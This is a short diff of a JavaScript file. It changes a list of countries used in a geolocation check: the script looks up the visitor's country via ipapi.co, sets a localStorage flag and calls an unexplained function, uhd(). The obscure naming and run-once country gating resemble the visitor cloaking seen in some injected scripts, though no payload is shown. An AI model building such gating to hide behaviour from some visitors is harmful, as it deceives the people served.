@@ -6,7 +6,9 @@ if (!localStorage.xcaf) {
 
         let aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
         
-        if(/United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania/i.test(aa)){
+       // United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
+        
+        if(/Canada|New Zealand|United Kingdom|United States|Slovakia|Australia|Belgium|Finland|Germany|Norway|Ireland|China|Hong Kong|Singapore|France|Switzerland|Lithuania/i.test(aa)){
             localStorage.xcaf=2;
             uhd()
         }
